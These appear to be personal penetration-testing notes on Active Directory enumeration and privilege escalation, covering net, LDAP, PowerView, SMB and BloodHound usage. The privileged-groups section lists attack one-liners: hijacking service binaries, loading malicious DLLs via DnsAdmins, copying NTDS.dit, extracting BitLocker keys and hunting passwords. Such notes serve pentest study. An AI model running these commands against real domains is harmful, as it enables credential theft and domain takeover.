---
layout: blank
---

AD Cheat Sheet - https://wadcoms.github.io/#

AD mindmap - https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg

### AD Intro
- Organizational Units (OUs)
	- Basically categories for group policy settings and permissions
	- These can be hierarchical (for example, two OUs for two sub-organizations within a company)
- Ensure to enumerate from all users we have access to
- When using xfreerdp, use `/d:` for domain name

### Manual Enumeration

**User Enumeration**
- If something reveals the names of employees, use this to guess at usernames. Can try to see if each user doesn't have preauth
**Enumeration using Windows Tools**
- `net user /domain` will display all domain user accounts
	- `net user {user} /domain`
		- This shows comments on a user, which can contain passwords
		- This also shows logon scripts, which can be interesting
- `net group /domain` will give us the domain groups
	- A group assigns permissions to resources (users and other groups)
	- `net group "{group}" /domain`
	- Some uncommon but useful groups:
		- https://ss64.com/nt/syntax-security_groups.html - all groups
		- AD Recycle Bin 
			- Can read deleted AD objects
			- `Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects`
			- `Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName={name})(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *`
		- (Enterprise) Key Admins
			- Used for managing Bitlocker keys
			- `Get-ADComputer -Filter * -Properties msFVE-RecoveryPassword | Select-Object Name, 'msFVE-RecoveryPassword'`
		- Pre–Windows 2000 Compatible Access
			- Can read most objects due to compatability
			- `Get-ADUser -Filter * -Properties MemberOf | Select-Object Name, MemberOf`
			- `Get-ADObject -LDAPFilter "(&(objectCategory=Person)(objectClass=user))" -Properties *`
		- Server Operators
			- Can modify service binaries and restart them
			- `sc.exe config YourServiceName binPath= "C:\path\to\malicious\binary.exe"`
			- `sc.exe start YourServiceName`
		- Print Operators
			- Can be good for DLL hijacking
			- `rundll32.exe C:\path\to\malicious.dll,MainEntryPoint`
		- Account Operators
			- Can add permissions to users or users to groups, such as becoming a local Administrator or managing a service running with higher privileges
			- `net localgroup Administrators TargetUser /add`
			- `sc.exe sdset "ServiceName" "D:(A;;CCLCRPRC;;;S-1-5-21-[SID of TargetUser])"`
		- Backup Operators
			- Can backup sensitive files, like NTDS.dit
			- `vssadmin create shadow /for=C:` 
			- `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit`
		- Dns Admins
			- Can perform dll hijacking to priv esc
			- `dnscmd /config /serverlevelplugindll \\malicious\share\malicious.dll`

**Enumeration with PowerShell and .NET Classes**
- LDAP is the communication channel that AD uses to query things
	- If a domain machine searches for a printer, the search query uses LDAP
	- `LDAP://{Hostname}:{port}/{/DN}`
	- LdapDomainDump - outputs to a pretty HTML page
		- `sudo ldapdomaindump ldaps://{IP} -u '{username}' -p '{password}'`
- Checking for anonymous LDAP bind
	- `ldapsearch -x -H ldap://{IP} -b "dc={domain},dc={TLD}" 
	- This can yield a ton of information, such as users on the system
		- `ldapsearch -x -H ldap://{IP} -b "dc={domain},dc={tld}" "(objectClass=person)"`
		- [More info](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)
		- Users can have custom fields added, so check each user/group for passwords
			- `| grep -iE "pass|pwd|secret|cred|auth|token|key"`
			- If we find anonymous ldap bind, slowing down for 5-10 mins and just processing the entire output could be nice
	- Checking lockout policy: `ldapsearch -D '{domain}' -w '{password}' -p 389 -h {IP} -b "dc={domain},dc={tld}" -s sub "*" | grep lockoutThreshold`
- Distinguished names (DNs)
	- Uniquely identifies domain objects
	- `CN={obj_name},CN={container},DC={domain_component1},DC={domain_component1}`
		- `CN=Stephanie,CN=Users,DC=corp,DC=com`

**.NET Classes**
- https://learn.microsoft.com/en-us/dotnet/api/?view=net-8.0
- Has a class related to AD, `System.DirectoryServices.ActiveDirectory`
	- Inside this class are multiple classes, like `Domain`
	- Can run `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()` to get the current Domain
- Can use this info to construct LDAP path script

**Using Search Functionality**
- Directory Entry
	- Class which encapsulates AD objects, can pass LDAP paths to it
	- Can also be used to authenticate
- Directory Searcher
	- Must be passed AD service we want to query
	- Has FindAll(), which returns collection of all AD entries
		- This returns a ton, so we need to filter the script (`samAccountType=805306368` to filter for users)
- Can turn this into a function where parameters can be passed
	- Use with `Import-Module .\{name}.ps1` and `LDAPSearch -q "({key}={value})"`
		- `LDAPSearch -q "(samAccountType=805306368)"`
		- `LDAPSearch -q "(objectclass=group)"`
```
function LDAPSearch {
    param (
        [string]$q
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $q)

    return $DirectorySearcher.FindAll()

}
```
- Can then use the output with filtering
	- `foreach ($group in $(LDAPSearch -q "(objectCategory=group)")) { $group.properties | select {$_.cn}, {$_.member}}`
		- Just basically shows the CN and members for each group 
		- This will additionally show nested groups, which `net.exe` doesn't

### Enumeration with PowerView
- https://powersploit.readthedocs.io/en/latest/Recon/
- https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
	- Import it using `Import-Module .\PowerView.ps1`
	- Don't wget the mf repo dumbass
- Enumeration commands
	- `Get-NetDomain` - gives basic domain info
	- `Get-NetUser` - lists users within the domain
		- Lotta info, so select the user (and other info) with `Get-NetUser | select CN,pwdlastset,lastlogon`
		- List descriptions: `Get-NetUser | Select-Object SamAccountName, Description`
		- Can also list service users with `-SPN`
	- `Get-NetGroup` - enumerate groups
	- `Get-NetComputer` - enumerate computer objects in the domain
		- `Get-NetComputer | select operatingsystem,dnshostname`
		- For all IPs `Get-NetComputer | ForEach-Object { $_.dnshostname | ForEach-Object { [System.Net.Dns]::GetHostAddresses($_) | Select-Object IPAddressToString } }`
	- `Find-LocalAdminAccess` - determines if our user has administrative permissions on any computers in the domain
		- Uses the Service Control Manager, which maintains database of installed services and drivers on all Windows computers
	- `Get-NetSession -ComputerName {computername} -Verbose `
		- This one can return no data/wrong data depending on permissions
	- `Get-ObjectAcl -Identity Stephanie > output.txt` - Returns all access control entries (forming an Access Control List) for Stephanie
		- `Convert-SidToName` will convert a SID to a domain name object
		- `ActiveDirectoryRights` can be pretty interesting, as `GenericAll` is the highest access permissions for an object
			- `Get-ObjectAcl -Identity {identity} | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights` will show all SIDs that have GenericAll for the `identity` passed
				- The `identity` passed can be something like a domain group or user
			- Can then `{sid} | Convert-SidToName` to see what objects have those permissions on that identity
				- Can also just `Get-ObjectAcl -Identity "{identity}" | Where-Object { $_.ActiveDirectoryRights -eq "GenericAll" } | Select-Object -ExpandProperty SecurityIdentifier | Convert-SidToName`
	- `Find-DomainShare` will list all domain shares
		- Domain shares can be shared folders/files, printers, or other resources
		- Look for interesting shares, like NETLOGON, SYSVOL, backups, docshares, or tools
		- Can view internals using `ls \\{domain}\{share}` and read files with `cat`
			- Will sometimes find encrypted Group Policy Preferences passwords, which have a known key and can be decrypted in kali with `gpp-decrypt`

### Manual Enumeration
- `PsLoggedOn.exe` - uses Remote Registry service to enumerate registry keys to see who's logged on to a system
	- Not enabled by default on workstations since Windows 8, but it enabled by default on servers like 2012, 2016, 2019, and 2022
	- Usage: `.\PsLoggedOn.exe \\{computer name}`
	- If we found from `Find-LocalAdminAccess` that we have Admin access to a machine where another user is logged on, we should be able to take their hashes
- Enumerating SMB
	- `smbclient` is great for listing/connecting to smb shares
		-  List smb shares: `smbclient -N -L //{domain}/ -I IP`
		- Connect to smb share: `smbclient -N //{domain}/{share} -I {IP}`
			- With creds: `smbclient //{IP}/{share} -U {username}%{password}`
		- To remove null bytes: `tr -d '\000' < input_file > output_file`
	- With credentials, enumerate all shares with crackmapexec (shown below)
- Enumerating Service Accounts
	- Service accounts are services launched by the system
	- They're assigned a Service Principal Name (SPN) which associates the service to a service account in AD
	- `setspn.exe` is installed by default on Windows
		- `setspn -L iis_service` 
		- `Get-NetUser -SPN` will also list the service users
- Can use `crackmapexec` to enumerate shares/users/groups
	- `crackmapexec smb {IP} -u {username} -p {password} --shares`
	- `nxc smb {IP} -u {username} -p {password} --rid-brute 3000`
	- Anonymous logon would be username `anonymous` and empty password
	- To enumerate everything:
		- `crackmapexec smb {IP} -u {username} -p {password} --all`

### Automatic Enumeration

**Enum4Linux**
- Just run `enum4linux {IP}`

**BloodHound/SharpHound**
- Capturing the system data with BloodHound:
	- [SharpHound](https://github.com/BloodHoundAD/SharpHound/releases/tag/v1.1.1)
		- Use version 1.1.1 for kali's 4.3.1 bloodhound
		- `Invoke-WebRequest {url} -Outfile {outfile}; Expand-Archive {outfile}`
		- Use with `Import-Module .\SharpHound.ps1`
	- `Invoke-BloodHound -CollectionMethod All -OutputDirectory {dir} -OutputPrefix {filename_prefix}`
	- Look at misc notes for getting the file off of the system
- Apparently you can do this from KALI??
	- `apt install bloodhound`
	- `pip install bloodhound`
	- `bloodhound-python -u {user} -p "{password}" -d {domain} -ns {IP} -c all`
- Analyzing the data with SharpHound
	- Use neo4j on kali machine - `sudo neo4j start`
		- If not installed, just run `neo4j` and install the suggested option
		- Go to localhost:7474 in the browser, set a new password
	- Now we can run `bloodhound`
		- Sign in with new password set
		- Upload the SharpHound zip folder using button on right
	- This will show all data collected AS THE CURRENT USER
		- It will have no idea if other users have local admin access on other workstations, only current user
- Things to check out
	- Path to high value targets from owned users
	- Path to other users on the system
		- There might not be built in queries for this one, so go to each individual users and see the shortest paths to them
	- Outbound object control of common groups (Everyone, Domain Users, Authenticated Users, etc.)
		- There could be instances where all authenticated users can control some workstation
	- Queries:
		- All computers: `MATCH (m:Computer) RETURN m`
		- All users: `MATCH (m:User) RETURN m`
		- Active sessions: `MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p`
		- Get all hostnames (for massive internal networks): `./cypher-shell -u neo4j -p {password} 'MATCH (c:Computer) WHERE toLower(c.name) ENDS WITH ".example.domain.tld" RETURN c.name' --format plain | tee hostnames.txt`
	- Interesting paths:
		1. Find Workstations where Domain Users can RDP
		2. Find Servers where Domain Users can RDP
		3. Find Computers where Domain Users are Local Admin
		4. Shortest Path to Domain Admins from Owned Principals
		5. List Kerberoastable users
		6. User SPNs (what can certain users access)



